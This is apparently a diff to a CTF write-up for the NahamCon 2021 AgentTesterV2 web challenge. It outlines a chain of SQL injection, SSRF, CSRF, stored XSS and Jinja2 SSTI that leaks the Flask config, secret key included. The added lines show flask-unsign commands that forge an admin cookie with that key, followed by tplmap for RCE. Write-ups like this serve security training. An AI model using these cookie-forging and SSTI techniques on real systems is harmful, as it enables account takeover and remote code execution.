@@ -16,7 +16,7 @@ tags: [ctf, NahamCon CTF, web]
  >
  > Source: https://ctf.nahamcon.com/files/354c72ad810a5c9e05c55bc3c6cb6e35/agenttesterV2.zip or [mirror](https://github.com/sajjadium/CTFium/)
 
-Union SQLi via websocket to SSRF bot to my own site hosting a CSRF to make bot update its profile with a PXSS in the `about` field. The XSS exploits a Jinja2 SSTI on `/debug` and exfils the Flask config back to my own server. Forge admin JWT using `SECRET_KEY` and exploit SSTI directly to gain RCE.
+Union SQLi via websocket to SSRF bot to my own site hosting a CSRF to make bot update its profile with a PXSS in the `about` field. The XSS exploits a Jinja2 SSTI on `/debug` and exfils the Flask config back to my own server. Forge admin cookie using `SECRET_KEY` and exploit SSTI directly to gain RCE.
 
 Surprisingly my solution was unintended, see the author's [write-up](https://github.com/jorgectf/Created-CTF-Challenges/tree/main/challenges/AgentTester%20@%20NahamConCTF%202021) for the intended solution (or [this](https://github.com/b4bergi/ctf-writeups/blob/main/nahamcon-2021/AgentTesterV2.md) one by [@bergi](https://twitter.com/alkiiis)).
 
@@ -66,7 +66,14 @@ Decode the Flask config.
 <Config {'ENV': 'production', 'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'PRESERVE_CONTEXT_ON_EXCEPTION': None, 'SECRET_KEY': '1L5&wqXM+kz5nIh4!Rz6Ufo^iY?aRyV2', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'auth2', 'SESSION_COOKIE_DOMAIN': False, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(seconds=43200), 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'JSON_AS_ASCII': True, 'JSON_SORT_KEYS': True, 'JSONIFY_PRETTYPRINT_REGULAR': False, 'JSONIFY_MIMETYPE': 'application/json', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'SQLALCHEMY_DATABASE_URI': 'sqlite:///DB/db.sqlite', 'SQLALCHEMY_TRACK_MODIFICATIONS': False, 'SQLALCHEMY_BINDS': None, 'SQLALCHEMY_NATIVE_UNICODE': None, 'SQLALCHEMY_ECHO': False, 'SQLALCHEMY_RECORD_QUERIES': None, 'SQLALCHEMY_POOL_SIZE': None, 'SQLALCHEMY_POOL_TIMEOUT': None, 'SQLALCHEMY_POOL_RECYCLE': None, 'SQLALCHEMY_MAX_OVERFLOW': None, 'SQLALCHEMY_COMMIT_ON_TEARDOWN': False, 'SQLALCHEMY_ENGINE_OPTIONS': {}}>
 ```
 
-Forge the admin JWT cookie using the compromised `SECRET_KEY` and run [tplmap](https://github.com/epinna/tplmap) to automagically exploit the SSTI.
+Forge the admin cookie using the compromised `SECRET_KEY`.
+```console
+$ pip install flask-unsign # https://github.com/Paradoxis/Flask-Unsign
+$ flask-unsign --sign --cookie '{"id":1}' --secret '1L5&wqXM+kz5nIh4!Rz6Ufo^iY?aRyV2'
+eyJpZCI6MX0.YE9lrw.elOMaOW2TjIXYArR8BGPmBoV50g
+```
+
+Run [tplmap](https://github.com/epinna/tplmap) to automagically exploit the SSTI.
 <!-- {% raw %} -->
 ```console
 $ git clone https://github.com/epinna/tplmap && cd tplmap
